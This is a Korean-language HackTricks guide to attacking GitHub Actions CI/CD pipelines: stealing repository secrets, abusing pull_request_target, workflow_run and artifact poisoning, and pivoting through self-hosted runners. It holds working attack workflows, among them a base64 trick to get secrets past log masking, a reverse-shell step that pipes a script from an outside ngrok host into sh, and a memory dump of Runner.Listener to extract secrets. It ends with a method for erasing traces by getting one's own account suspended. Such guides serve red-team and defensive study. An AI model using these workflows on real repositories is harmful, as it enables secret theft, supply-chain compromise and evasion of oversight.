# Github Actions 남용하기

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 기본 정보

이 페이지에서는 다음을 찾을 수 있습니다:

* 공격자가 Github Action에 액세스하는 것의 **모든 영향에 대한 요약**
* 액션에 **액세스하는 다양한 방법**:
* 액션을 생성할 **권한**이 있는 경우
* **Pull Request** 관련 트리거를 남용하는 경우
* **기타 외부 액세스** 기술을 남용하는 경우
* 이미 침해된 저장소에서 **피벗**하는 경우
* 마지막으로, **내부에서 액션을 남용하기 위한 사후 공격 기술**에 대한 섹션 (언급된 영향을 일으키기 때문)

## 영향 요약

[**Github Actions에 대한 기본 정보**](../basic-github-information.md#github-actions)에 대한 소개를 참조하세요.

**저장소**에서 임의의 **Github 액션을 실행/코드를 주입**할 수 있는 경우 다음을 수행할 수 있습니다:

* 해당 저장소/조직에서 **비밀**을 **훔칠 수 있습니다**.
* 주입만 할 수 있다면, 워크플로에 이미 존재하는 것을 훔칠 수 있습니다.
* AWS 및 GCP와 같은 다른 플랫폼에 액세스하기 위해 **저장소 권한**을 남용할 수 있습니다.
* 사용자 정의 워커에서 **코드를 실행**할 수 있으며, 거기에서 피벗을 시도할 수 있습니다.
* 저장소 **코드를 덮어쓸 수 있습니다**.
* 이는 `GITHUB_TOKEN`의 권한에 따라 달라집니다 (있는 경우).
* **배포** 및 기타 **아티팩트**를 **침해**할 수 있습니다.
* 코드가 배포하거나 저장하는 경우, 해당 코드를 수정하여 추가적인 액세스를 얻을 수 있습니다.

## GITHUB\_TOKEN

이 "**비밀**" (`${{ secrets.GITHUB_TOKEN }}` 및 `${{ github.token }}`에서 가져옴)은 관리자가 이 옵션을 활성화할 때 제공됩니다:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

이 토큰은 **Github 애플리케이션이 사용하는 것과 동일**하므로 동일한 엔드포인트에 액세스할 수 있습니다: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github는 GitHub 내에서 다른 저장소에 액세스할 수 있도록 하는 [**플로우**](https://github.com/github/roadmap/issues/74)를 출시해야 합니다. 이를 위해 저장소는 `GITHUB_TOKEN`을 사용하여 다른 내부 저장소에 액세스할 수 있습니다.
{% endhint %}

이 토큰의 가능한 **권한**은 다음에서 확인할 수 있습니다: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

이 토큰은 작업이 완료된 후 **만료**됩니다.\
이 토큰은 다음과 같은 형식을 가지고 있습니다: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

이 토큰으로 할 수 있는 몇 가지 흥미로운 작업:

{% tabs %}
{% tab title="PR 병합" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="PR 승인" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PR 생성" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
여러 번의 경우에 **Github Actions envs나 secrets에서 github 사용자 토큰을 찾을 수 있습니다**. 이러한 토큰은 저장소와 조직에 대해 더 많은 권한을 부여할 수 있습니다.
{% endhint %}

<details>

<summary>Github Action 출력에서 비밀 목록 나열</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>시크릿을 사용하여 리버스 쉘 획득하기</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

다른 사용자의 저장소에서 Github 토큰에 부여된 권한을 확인하는 것이 가능합니다. 이를 위해서는 액션의 로그를 확인해야 합니다:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## 허용된 실행

{% hint style="info" %}
이는 Github 액션을 침해하는 가장 쉬운 방법일 것입니다. 이 경우에는 조직에서 **새로운 저장소를 생성할 수 있는 권한**이 있거나 **저장소에 대한 쓰기 권한**이 있는 것을 전제로 합니다.

이러한 시나리오에 해당하는 경우 [포스트 익스플로잇 기술](./#post-exploitation-techniques-from-inside-an-action)을 확인할 수 있습니다.
{% endhint %}

### 저장소 생성으로 실행

조직의 구성원이 **새로운 저장소를 생성**할 수 있고 Github 액션을 실행할 수 있는 경우, **새로운 저장소를 생성하고 조직 수준에서 설정된 비밀을 탈취**할 수 있습니다.

### 새로운 브랜치로 실행

이미 Github 액션이 구성된 저장소에서 **새로운 브랜치를 생성**할 수 있다면, 해당 액션을 **수정**하고, **컨텐츠를 업로드**한 다음 **새로운 브랜치에서 해당 액션을 실행**할 수 있습니다. 이렇게 하면 저장소 및 조직 수준의 비밀을 유출할 수 있습니다 (하지만 어떻게 호출되는지 알아야 합니다).

수정된 액션을 **수동으로** 실행하거나, **PR이 생성**될 때 또는 **코드가 푸시**될 때 (소음을 얼마나 만들고 싶은지에 따라) 실행할 수 있습니다:
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## 포크된 실행

{% hint style="info" %}
공격자가 **다른 저장소의 Github Action을 실행**할 수 있게 해주는 다양한 트리거가 있습니다. 이러한 트리거 가능한 액션들이 잘못 구성되어 있다면, 공격자는 그들을 침해할 수 있을 수도 있습니다.
{% endhint %}

### `pull_request`

워크플로 트리거 **`pull_request`**는 기본적으로 **처음으로** 협업하는 경우를 제외하고는 풀 리퀘스트가 수신될 때마다 워크플로를 실행합니다. 워크플로 실행을 **승인**하기 위해 기본적으로 **유지자**가 필요합니다:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**처음으로** 기여하는 경우에만 기본 제한이 적용되므로, 유효한 버그/오타를 수정하고 새로운 `pull_request` 권한을 남용하기 위해 **다른 PR을 보낼 수 있습니다**.

**이를 테스트해 보았지만 작동하지 않습니다**: ~~또 다른 옵션은 프로젝트에 기여한 사람의 이름으로 계정을 생성하고 해당 계정을 삭제하는 것입니다.~~
{% endhint %}

또한, 기본적으로 **대상 저장소에 대한 쓰기 권한**과 **비밀 접근**을 방지합니다. 이는 [**문서**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)에서 언급되어 있습니다:

> `GITHUB_TOKEN`을 제외한 **비밀은 포크된** 저장소에서 워크플로가 트리거될 때 **런너로 전달되지 않습니다**. **`GITHUB_TOKEN`은 포크된 저장소의 풀 리퀘스트에서 읽기 전용 권한**을 갖습니다.

공격자는 Github Action의 정의를 수정하여 임의의 작업을 실행하고 임의의 액션을 추가할 수 있습니다. 그러나 언급된 제한 사항으로 인해 비밀을 도난하거나 저장소를 덮어쓸 수는 없습니다.

{% hint style="danger" %}
**네, 공격자가 PR에서 트리거될 Github Action을 변경하면, 그의 Github Action이 사용되고 원래 저장소의 것은 사용되지 않습니다!**
{% endhint %}

공격자는 실행되는 코드를 제어하기 때문에, `GITHUB_TOKEN`에 비밀이나 쓰기 권한이 없더라도 악성 아티팩트를 업로드할 수 있습니다.

### **`pull_request_target`**

워크플로 트리거 **`pull_request_target`**은 대상 저장소에 대한 **쓰기 권한**과 **비밀 접근**을 갖고 있으며 (권한을 요청하지 않음).

참고로, 워크플로 트리거 **`pull_request_target`**은 PR에서 제공된 컨텍스트가 아닌 **기본 컨텍스트**에서 실행됩니다 (신뢰할 수 없는 코드를 실행하지 않기 위해). `pull_request_target`에 대한 자세한 정보는 [**문서**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)를 확인하세요.\
또한, 이 특정 위험한 사용에 대한 자세한 정보는 이 [**github 블로그 포스트**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)를 확인하세요.

실행되는 워크플로는 **기본**에서 정의된 것이므로 **`pull_request_target`**을 사용하는 것이 **안전**해 보일 수 있지만, 몇 가지 경우에는 그렇지 않을 수 있습니다.

이 경우에는 **비밀에 접근**할 수 있습니다.

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) 트리거는 `completed`, `requested`, `in_progress`일 때 다른 워크플로에서 워크플로를 실행할 수 있도록 합니다.

다음 예제에서는 "Run Tests" 워크플로가 완료된 후에 워크플로를 실행하도록 구성되어 있습니다:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
또한 문서에 따르면: `workflow_run` 이벤트로 시작된 워크플로우는 이전 워크플로우와 관계없이 **비밀 정보에 액세스하고 토큰을 작성할 수 있습니다**.

이러한 유형의 워크플로우는 외부 사용자가 **`pull_request`** 또는 **`pull_request_target`**를 통해 트리거 할 수 있는 워크플로우에 **의존하는 경우** 공격을 받을 수 있습니다. 취약한 예는 [**이 블로그에서 찾을 수 있습니다**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** 첫 번째 예는 **`workflow_run`**이 트리거된 워크플로우가 공격자의 코드를 다운로드하는 것입니다: `${{ github.event.pull_request.head.sha }}`\
두 번째 예는 신뢰할 수 없는 코드에서 **artifact**를 **`workflow_run`** 워크플로우로 전달하고 이 artifact의 내용을 사용하여 RCE에 취약하게 만드는 것입니다.

### `workflow_call`

TODO

TODO: pull\_request에서 실행되는 경우 사용된/다운로드된 코드가 원본 또는 포크된 PR에서 가져오는지 확인

## 포크된 실행 남용

외부 공격자가 github 워크플로우를 실행할 수 있는 모든 방법을 언급했으니, 이제 실행이 잘못 구성된 경우 어떻게 남용될 수 있는지 살펴보겠습니다:

### 신뢰할 수 없는 checkout 실행

**`pull_request`**의 경우 워크플로우는 **PR의 컨텍스트에서 실행**됩니다(따라서 **악성 PR의 코드**가 실행됩니다), 하지만 누군가가 **먼저 승인**해야 하며 일부 [제한 사항](./#pull\_request)으로 실행됩니다.

**`pull_request_target` 또는 `workflow_run`**을 사용하는 워크플로우가 **`pull_request_target` 또는 `pull_request`**에서 트리거 될 수 있는 워크플로우에 의존하는 경우 원본 저장소의 코드가 실행되므로 **공격자는 실행된 코드를 제어할 수 없습니다**.

{% hint style="danger" %}
그러나 **액션**에 **명시적인 PR checkout**이 있는 경우 PR 코드(기본 코드가 아닌)를 사용합니다. 예를 들어 (PR 코드가 다운로드되는 12번째 줄을 확인하세요):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

잠재적으로 **신뢰할 수 없는 코드는 `npm install` 또는 `npm build`** 중에 실행됩니다. 빌드 스크립트와 참조된 **패키지는 PR 작성자가 제어**합니다.

{% hint style="warning" %}
취약한 액션을 검색하기 위한 github dork는 다음과 같습니다: `event.pull_request pull_request_target extension:yml` 그러나 액션이 보안 취약점이 있는 경우에도 작업을 안전하게 실행할 수 있는 다른 방법이 있습니다(예: PR을 생성하는 액터에 대한 조건부 사용).
{% endhint %}

### 컨텍스트 스크립트 삽입 <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

일부 [**github 컨텍스트**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context)는 PR을 생성하는 **사용자**에 의해 **제어**될 수 있는 값을 가지고 있음을 유의하세요. github 액션이 이 데이터를 사용하여 무언가를 실행한다면, 임의의 코드 실행으로 이어질 수 있습니다:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV 스크립트 삽입** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

문서에 따르면: 워크플로우 작업에서 **환경 변수를 정의하거나 업데이트**하고 이를 **`GITHUB_ENV`** 환경 파일에 작성함으로써 환경 변수를 이후 단계에서 사용할 수 있습니다.

공격자가 이 **env** 변수에 **임의의 값을 삽입**할 수 있다면, 이후 단계에서 **LD\_PRELOAD** 또는 **NODE\_OPTIONS**와 같은 환경 변수를 삽입할 수 있습니다.

예를 들어 ([**이것**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) 및 [**이것**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), 업로드된 artifact를 신뢰하는 워크플로우가 그 내용을 **`GITHUB_ENV`** 환경 변수에 저장하는 경우를 상상해보십시오. 공격자는 다음과 같은 내용을 업로드하여 워크플로우를 침해할 수 있습니다:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### 취약한 타사 Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**이 블로그 게시물**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks)에서 언급한 바와 같이, 이 Github 액션은 다른 워크플로우 및 저장소에서 artifact에 액세스할 수 있습니다.

문제는 **`path`** 매개변수가 설정되지 않은 경우 artifact가 현재 디렉토리에 추출되어 나중에 사용되거나 심지어 워크플로우에서 실행될 수 있는 파일을 덮어쓸 수 있다는 것입니다. 따라서 Artifact가 취약하다면, 공격자는 Artifact를 신뢰하는 다른 워크플로우를 침해하기 위해 이를 남용할 수 있습니다.

취약한 워크플로우의 예:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
이 작업 흐름으로 공격할 수 있습니다:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## 기타 외부 접근

### 삭제된 네임스페이스 저장소 탈취

계정이 이름을 변경하면 일정 시간 후에 다른 사용자가 해당 이름으로 계정을 등록할 수 있습니다. 저장소가 **변경된 후에 100개 미만의 스타**를 가지고 있었다면, Github는 동일한 이름을 가진 새로운 등록 사용자가 **삭제된 저장소와 동일한 이름의 저장소**를 생성할 수 있도록 허용합니다.

{% hint style="danger" %}
따라서, 액션이 존재하지 않는 계정의 저장소를 사용하는 경우, 공격자가 해당 계정을 생성하고 액션을 침해할 수 있습니다.
{% endhint %}

만약 다른 저장소가 **이 사용자 저장소의 종속성을 사용**하고 있다면, 공격자는 그들을 탈취할 수 있습니다. 더 자세한 설명은 다음에서 확인할 수 있습니다: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## 저장소 피벗

{% hint style="info" %}
이 섹션에서는 첫 번째 저장소에 어떤 종류의 액세스가 있는 경우, **다른 저장소로 피벗**할 수 있는 기술에 대해 이야기합니다 (이전 섹션을 확인하세요).
{% endhint %}

### 캐시 독립

캐시는 **동일한 브랜치에서 워크플로우 실행 사이에 유지**됩니다. 즉, 공격자가 **컴프라마이즈**된 **패키지**를 캐시에 저장하고 **다운로드**하고 **더 높은 권한을 가진** 워크플로우에서 실행하면 해당 워크플로우도 **침해**될 수 있습니다.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### 아티팩트 독립

워크플로우는 **다른 워크플로우 및 저장소의 아티팩트**를 사용할 수 있습니다. 공격자가 **아티팩트를 업로드하는** Github 액션을 **컴프라마이즈**하면 다른 워크플로우도 **침해**될 수 있습니다:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## 액션으로부터의 후발 작업

### OIDC를 통한 AWS 및 GCP 접근

다음 페이지를 확인하세요:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### 비밀 접근 <a href="#accessing-secrets" id="accessing-secrets"></a>

스크립트에 콘텐츠를 주입하는 경우, 비밀을 어떻게 액세스할 수 있는지 알아보는 것이 흥미로울 수 있습니다:

* 비밀 또는 토큰이 **환경 변수**로 설정된 경우, **`printenv`**를 사용하여 환경을 통해 직접 액세스할 수 있습니다.

<details>

<summary>Github 액션 출력에서 비밀 목록 나열</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>시크릿을 사용하여 역쉘 획득하기</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* 비밀이 **직접 표현식에서 사용**되는 경우, 생성된 셸 스크립트는 **디스크에 저장**되어 액세스할 수 있습니다.
* ```bash
cat /home/runner/work/_temp/*
```
* JavaScript 액션의 경우 비밀은 환경 변수를 통해 전송됩니다.
* ```bash
ps axe | grep node
```
* **사용자 정의 액션**의 경우, 프로그램이 **인수**에서 얻은 비밀을 사용하는 방식에 따라 위험이 다를 수 있습니다:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Self-hosted 러너 남용

**Github 인프라가 아닌 곳에서 실행되는 Github Actions**을 찾는 방법은 Github Action 구성 yaml에서 **`runs-on: self-hosted`**를 검색하는 것입니다.

**Self-hosted** 러너는 **추가로 민감한 정보에 액세스**할 수 있으며, 다른 **네트워크 시스템**(네트워크의 취약한 엔드포인트? 메타데이터 서비스?)에도 액세스할 수 있습니다. 또한, 격리되고 파괴되더라도 **동시에 여러 액션이 실행**될 수 있으며, 악의적인 액션은 다른 액션의 비밀을 **훔칠 수** 있습니다.

Self-hosted 러너에서는 **_Runner.Listener_ 프로세스**에서 워크플로우의 모든 비밀을 덤프하여 언제든지 액션의 단계에서 얻을 수도 있습니다:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

[**이 게시물에서 자세한 정보를 확인하세요**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github 도커 이미지 레지스트리

Github 액션을 사용하여 **도커 이미지를 빌드하고 Github 내에 저장**할 수 있습니다.\
다음 확장에서 예제를 찾을 수 있습니다:

<details>

<summary>Github 액션 빌드 &#x26; 도커 이미지 푸시</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

이전 코드에서 볼 수 있듯이, Github 레지스트리는 **`ghcr.io`**에 호스팅됩니다.

레포지토리에 읽기 권한이 있는 사용자는 개인 액세스 토큰을 사용하여 Docker 이미지를 다운로드할 수 있습니다:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
그런 다음 사용자는 **Docker 이미지 레이어에서 유출된 비밀 정보를 검색**할 수 있습니다:

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions 로그에서 민감한 정보

**Github**은 액션 로그에서 **비밀 값을 감지**하고 **표시하지 않도록** 노력하지만, 액션 실행 중 생성된 **다른 민감한 데이터**는 숨겨지지 않습니다. 예를 들어, 비밀 값을 사용하여 서명된 JWT는 [특별히 구성되지 않는 한](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) 숨겨지지 않습니다.

## 자취를 감추기

(기술은 [**여기**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)에서 가져왔습니다) 우선, Github에서 제기된 모든 PR은 공개적으로 볼 수 있습니다. GitHub에서는 기본적으로 **인터넷의 PR을 삭제할 수 없습니다**, 하지만 한 가지 방법이 있습니다. Github에서 **중지된** 계정의 경우, 해당 계정의 **모든 PR이 자동으로 삭제**되고 인터넷에서 제거됩니다. 따라서 활동을 숨기려면 **GitHub 계정을 중지시키거나 계정을 신고**해야 합니다. 이렇게 하면 GitHub에서 모든 활동이 인터넷에서 숨겨집니다 (기본적으로 모든 악용 PR이 제거됨).

GitHub의 한 조직은 GitHub에 계정을 신고하는 데 매우 적극적입니다. 이슈에 "어떤 내용"을 공유하기만 하면, 그들은 12시간 내에 계정을 중지시킬 것입니다. 그러면 GitHub에서 악용이 보이지 않게 됩니다.

{% hint style="warning" %}
조직이 대상이 되었음을 알아차리는 유일한 방법은 GitHub UI에서 PR이 제거되기 때문에 SIEM에서 GitHub 로그를 확인하는 것입니다.
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
